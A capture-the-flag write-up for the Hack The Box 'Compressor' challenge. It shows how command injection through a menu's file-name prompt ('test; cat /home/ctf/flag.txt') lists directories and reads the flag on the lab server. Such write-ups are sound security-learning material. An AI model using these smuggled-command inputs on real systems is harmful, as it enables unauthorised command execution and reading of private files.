# Compressor

```
Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?
```

we connect to the service with netcat

```
nc XXX.XXX.XXX.XXX 30302
```

upon connecting we are displayed a menu to interact with, choosing one of the options we see some commands we can use

```bash
[*] Directory to work in: 3rKK3ktZNWMK9rLXl1nwE1yjfN9QwHWp

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 3

[*] Sub-directory to work in: 3rKK3ktZNWMK9rLXl1nwE1yjfN9QwHWp/Hands


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

```

We control variables in these commands like `cat ./<name>` maybe we can perform command injection?

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: test; ls -la /home/ctf

Insert name you want to read: test; ls -la /home/ctf
cat: can't open './test': No such file or directory
total 172
drwxr-sr-x    1 ctf      ctf           4096 May 14 14:23 .
drwxr-xr-x    1 root     root          4096 Mar  3 15:18 ..
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:18 0e4qGLBq46FVw2WwPIwv6rYolhrQwhqh
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:16 2pMH9kWb5UY0YH8TQwMDgnWE0qnhvIOs
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:23 3rKK3ktZNWMK9rLXl1nwE1yjfN9QwHWp
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:17 3reu17gXVLmrOgSTksHhjgNznRD2vPu5
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:17 6fZ6GBjYWKjumXbznFQtsQDQrWGFlMoR
drwxr-sr-x    6 ctf      ctf           4096 May 14 14:17 8QWtVdz2sd9IsuzHQ6RXA1ghBXx0xOPT

...
```

great now just read the flag

```
Insert name you want to read: test; cat /home/ctf/flag.txt
cat: can't open './test': No such file or directory
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}

```